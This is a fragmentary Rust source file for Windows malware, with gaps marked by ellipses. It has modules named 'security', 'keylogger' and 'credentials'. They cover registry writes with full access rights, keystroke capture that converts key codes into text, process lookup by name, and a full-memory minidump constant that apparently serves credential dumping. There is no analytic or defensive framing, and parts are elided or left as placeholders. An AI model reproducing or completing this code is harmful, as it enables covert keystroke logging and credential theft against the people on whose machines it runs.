...
use winapi::um::winnt::{
    ...
    REG_DWORD, KEY_ALL_ACCESS, REG_OPTION_NON_VOLATILE,
...
const MINI_DUMP_WITH_FULL_MEMORY: MINIDUMP_TYPE = 0x00000002; // Explicitly define the constant
...
mod security {
    ...
    fn set_reg_dword(key_path: &str, value_name: &str, value: DWORD) {
        unsafe {
            let mut hkey = null_mut();
            let mut disp = 0;
            let path_wide = to_wstring(key_path);
            let name_wide = to_wstring(value_name);
...
mod keylogger {
    ...
    fn key_to_string(key: i32) -> Option<String> {
        let shift_pressed = unsafe { (GetKeyState(VK_SHIFT) & 0x8000u16 as i16) != 0 };
        let caps_lock_on = unsafe { (GetKeyState(VK_CAPITAL) & 1) != 0 };
        let upper = (shift_pressed && !caps_lock_on) || (!shift_pressed && caps_lock_on);

        match key {
            0x08 => Some("[BACKSPACE]".to_string()),
            0x0D => Some("\n".to_string()),
            0x20 => Some(" ".to_string()),
            // Add many more key translations here...
            0x30..=0x39 => Some(((key - 0x30) as u8 + b'0') as char).map(|c| c.to_string()),
            0x41..=0x5A => {
                let base = if upper { b'A' } else { b'a' };
                Some(((key - 0x41) as u8 + base) as char).map(|c| c.to_string())
            },
            _ => None,
        }
    }
...
mod credentials {
    ...
    fn find_process_by_name(name: &str) -> Option<DWORD> {
        ...
        if unsafe { Process32FirstW(snapshot, &mut entry) } == TRUE {
            loop {
                let process_name = String::from_utf16_lossy(&entry.szExeFile).to_owned();
